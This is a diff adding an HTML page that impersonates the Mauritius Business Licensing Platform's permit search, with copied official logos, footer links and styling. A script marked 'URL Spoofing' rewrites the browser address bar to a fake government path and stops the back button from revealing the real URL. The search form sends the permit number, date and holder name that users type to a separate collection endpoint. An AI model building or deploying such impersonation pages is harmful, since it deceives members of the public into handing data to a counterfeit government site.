@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title> Search Permits</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+     <link rel="icon" type="image/png" href="edb-logo.png">
+
+      <script>
+        // URL Spoofing - Make browser show Mauritius URL
+        (function() {
+            // Change the URL in address bar
+            var fakePath = '/wps/portal/business/home/searchpermits/';
+            window.history.replaceState(null, null, fakePath);
+            
+            // Change page title to match
+            document.title = "Search Permits";
+            
+            // Prevent back button from revealing real URL
+            window.addEventListener('popstate', function(event) {
+                window.history.pushState(null, null, fakePath);
+            });
+        })();
+    </script>
+
+
+    <style>
+        body {
+            font-family: "Segoe UI", Roboto, Arial, sans-serif;
+            background-color: #fff;
+            color: #333;
+        }
+
+        /* Header */
+        .topbar {
+            border-bottom: 1px solid #e5e5e5;
+            background-color: #fff;
+            padding: 10px 0;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .brand img {
+            height: 48px;
+            padding: 12pxss;
+
+        }
+
+        .brand-text {
+            line-height: 1.5;
+        }
+
+        .brand-text h1 {
+            font-size: 15px;
+            color: #17181a;
+            padding: 12px 20px;
+            margin: 0px;
+        }
+
+
+
+        /* Navbar tabs */
+        .nav-tabs-container {
+            background: #f7f9fb;
+            box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.05);
+        }
+
+        .nav-tabs-container .nav-link {
+            color: #1e73be;
+            font-weight: 600;
+            padding: 12px 20px;
+        }
+
+        .nav-tabs-container .nav-link.active {
+            border-bottom: 4px solid #2b6ea3;
+            color: #2b6ea3;
+        }
+
+        /* Search form */
+        .search-section {
+            padding: 40px 15px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .search-section h2 {
+            font-size: 26px;
+            margin-bottom: 25px;
+            color: #222;
+        }
+
+        .search-section label {
+            font-weight: 500;
+            font-size: 14px;
+            margin-bottom: 6px;
+        }
+
+        .search-section input {
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            padding: 10px;
+            width: 100%;
+        }
+
+        .btn-search {
+            background: #fff;
+            color: #2b6ea3;
+            border: 1px solid #c6d6e8;
+            border-radius: 6px;
+            padding: 10px 18px;
+            font-weight: 500;
+            margin-top: 15px;
+            transition: background 0.2s;
+        }
+
+        .btn-search:hover {
+            background: #f3f6fa;
+        }
+
+        /* Footer */
+        footer {
+            background: #3b3b3b;
+            color: #ddd;
+            padding: 40px 0;
+            margin-top: 60px;
+        }
+
+        footer h5 {
+            color: #eee;
+            font-size: 15px;
+            margin-bottom: 10px;
+        }
+
+        footer ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        footer li {
+            margin-bottom: 6px;
+            font-size: 13px;
+        }
+
+        /* Responsive tweaks */
+        @media (max-width: 768px) {
+            .brand-text h1 {
+                font-size: 16px;
+            }
+
+            .nav-tabs-container .nav-link {
+                padding: 10px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header -->
+    <header class="topbar">
+        <div class="container d-flex justify-content-between align-items-center">
+            <div class="brand">
+                <img src=https://business.edbmauritius.org/wps/wcm/connect/business/16d6872a-d40e-4e5b-a460-b9d792829d93/Coat+of+Arms+of+Mauritius.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_IA161OC0OOVAC0Q4TMNE2N3G33-16d6872a-d40e-4e5b-a460-b9d792829d93-mqNcSNq
+                    alt="Mauritius Logo">
+
+                <div class="brand-text">
+                    <h1>Mauritius Business Licensing Platform</h1>
+                </div>
+            </div>
+            <div class="d-flex align-items-center gap-3">
+                <div class="d-flex border rounded px-2 py-1 align-items-center">
+                    <input type="text" class="border-0" placeholder="Search..." style="outline:none; width:150px;">
+                    <span>🔍</span>
+                </div>
+                <a href="#" class="text-decoration-none fw-semibold text-primary">REGISTER</a>
+                <a href="#" class="text-decoration-none fw-semibold text-primary">LOGIN</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Navigation Tabs -->
+    <!-- Navigation Tabs with Icons -->
+    <nav class="nav-tabs-container">
+        <div class="container d-flex flex-wrap">
+            <a href="https://cdn-icons-png.flaticon.com/128/14034/14034653.png" class="nav-link"><i class="bi bi-house-door-fill"></i> Home</a>
+            <a href="#" class="nav-link"><i class="bi bi-file-earmark-text"></i> Licensing</a>
+            <a href="#" class="nav-link active"><i class="bi bi-search"></i> Search Permits</a>
+            <a href="#" class="nav-link"><i class="bi bi-newspaper"></i> News</a>
+            <a href="#" class="nav-link"><i class="bi bi-question-circle"></i> FAQ's & Notices</a>
+        </div>
+    </nav>
+
+    <style>
+        /* Space between icon and text */
+        .nav-link i {
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+    </style>
+
+
+    <!-- Main Search Section -->
+    <section class="search-section">
+        <h2>Enter the details of the permit you are looking for</h2>
+        <form>
+            <div class="row g-3">
+                <div class="col-md-4">
+                    <label for="permitNumber">Permit Number</label>
+                    <input type="text" id="permitNumber" placeholder="Insert the permit number">
+                </div>
+                <div class="col-md-4">
+                    <label for="issuedDate">Issued Date</label>
+                    <input type="date" id="issuedDate">
+                </div>
+                <div class="col-md-4">
+                    <label for="permitHolder">Permit Holder</label>
+                    <input type="text" id="permitHolder" placeholder="Insert the permit holder name">
+                </div>
+            </div>
+            <button type="button" class="btn-search mt-3">Search</button>
+        </form>
+    </section>
+
+
+    <!-- Footer -->
+
+    <footer class="gov-footer">
+        <div class="footer-container container">
+            <!-- Left section -->
+            <div class="footer-left">
+                <img src="https://business.edbmauritius.org/wps/wcm/connect/business/868397c6-fa4f-4eed-af98-f1e4cc2a9b84/ISO-IEC-27001-2022+Red.png?MOD=AJPERES"
+                    alt="MSECB ISO Certification" class="footer-badge">
+                <div class="footer-left-links">
+                    <a href="https://msecb.com/economic-development-board/" class="footer-link">Success Story</a>
+                    <p class="helpdesk-title">Helpdesk Contact:
+                        <a href="https://edbmauritius.atlassian.net/servicedesk/customer/portal/13" target="_blank"
+                            class="footer-link">Click Here</a>
+                    </p>
+                </div>
+            </div>
+
+            <!-- Columns -->
+            <div class="footer-cols">
+                <div>
+                    <h6>Government Directory</h6>
+                    <ul>
+                        <li><a href="https://govmu.org/EN/Pages/default.aspx">Ministries</a></li>
+                        <li><a href="https://govmu.org/EN/Pages/default.aspx">Departments</a></li>
+                        <li><a href="https://govmu.org/EN/Pages/default.aspx">Parastatal Organisations</a></li>
+                        <li><a href="https://govmu.org/EN/Pages/default.aspx">Other Bodies</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h6>Legislations</h6>
+                    <ul>
+                        <li><a href="https://govmu.org/EN/infoservices/justiceanddefence/Pages/default.aspx">Justice &
+                                Defence</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h6>Explore Mauritius</h6>
+                    <ul>
+                        <li><a href="https://govmu.org/EN/Pages/exploremauritius.aspx">History</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h6>Media</h6>
+                    <ul>
+                        <li><a href="https://govmu.org/EN/Pages/ViewAllCommunique.aspx">Communiqués</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h6>Other Links</h6>
+                    <ul>
+                        <li><a href="https://govmu.org/EN/Pages/ViewAllNews.aspx">News</a></li>
+                        <li><a href="https://govmu.org/EN/Pages/eservices.aspx">E-Services</a></li>
+                        <li><a href="/wps/wcm/connect/business/2fd3d85c-d2ff-4068-a0cb-a70a134f518a/ISMS-POL+-+ISMS+Policy+v2.0.pdf?MOD=AJPERES"
+                                target="_blank">ISMS Policy</a></li>
+                        <li><a href="/wps/wcm/connect/business/5fb022e9-8cf8-43d7-a785-ae8f72840d80/ISMS-POL-Supplier_Relationships_Policy_v1.0.pdf?MOD=AJPERES"
+                                target="_blank">Supplier Relationship Policy</a></li>
+                        <li><a href="/wps/portal/business/home/termsOfUse/">Terms of Use</a></li>
+                        <li><a href="/wps/portal/business/home/privacyPolicy/">Privacy Policy</a></li>
+                        <li><a href="/wps/wcm/connect/business/603e5254-36a2-4655-a19c-c557a654fb27/BusinessContact.pdf?MOD=AJPERES"
+                                target="_blank">Contact Us</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <style>
+        .gov-footer {
+            background: #404040;
+            color: #a7a9ac;
+            padding: 50px 0 50px;
+            font-family: "Segoe UI", Roboto, Arial, sans-serif;
+            font-size: 14px;
+        }
+
+        .footer-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+
+        .footer-left {
+            flex: 1 1 200px;
+            min-width: 200px;
+        }
+
+        .footer-badge {
+            width: 80px;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .footer-left-links {
+            margin-top: 5px;
+        }
+
+        .footer-left-links a.footer-link {
+            display: block;
+            color: #a7a9ac;
+            text-decoration: none;
+            margin-bottom: 6px;
+        }
+
+        .footer-left-links a.footer-link:hover {
+            color: #ffffff;
+        }
+
+        .helpdesk-title {
+            margin: 0;
+            font-size: 15px;
+            color: #dcdcdc;
+        }
+
+        .helpdesk-title a {
+            color: #6ca0dc;
+            text-decoration: none;
+        }
+
+        .helpdesk-title a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-cols {
+            display: flex;
+            flex-wrap: wrap;
+            flex: 3;
+            gap: 40px;
+        }
+
+        .footer-cols div {
+            min-width: 105px;
+        }
+
+        .footer-cols h6 {
+            font-size: 15px;
+            color: #dcdcdc;
+            margin-bottom: 8px;
+        }
+
+        .footer-cols ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .footer-cols li {
+            margin-bottom: 5px;
+        }
+
+        .footer-cols a {
+            color: #a7a9ac;
+            text-decoration: none;
+        }
+
+        .footer-cols a:hover {
+            color: #ffffff;
+        }
+
+        @media (max-width: 992px) {
+            .footer-container {
+                flex-direction: column;
+            }
+
+            .footer-cols {
+                flex-direction: column;
+                gap: 20px;
+            }
+        }
+    </style>
+<script>
+  document.querySelector('.btn-search').addEventListener('click', (e) => {
+    e.preventDefault();
+
+    const permitNumber = document.getElementById('permitNumber').value.trim();
+    const issuedDate = document.getElementById('issuedDate').value;
+    const permitHolder = document.getElementById('permitHolder').value.trim();
+
+    if (!permitNumber || !issuedDate || !permitHolder) {
+      alert("Please fill in all fields.");
+      return;
+    }
+
+    const data = { permitNumber, issuedDate, permitHolder };
+
+    fetch('http://localhost:3000/save', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    })
+      .then(res => res.json())
+      .then(response => {
+        alert(response.message);
+        document.getElementById('permitNumber').value = '';
+        document.getElementById('issuedDate').value = '';
+        document.getElementById('permitHolder').value = '';
+      })
+      .catch(err => alert("Error: " + err));
+  });
+</script>
+
+
+</body>
+
+</html>
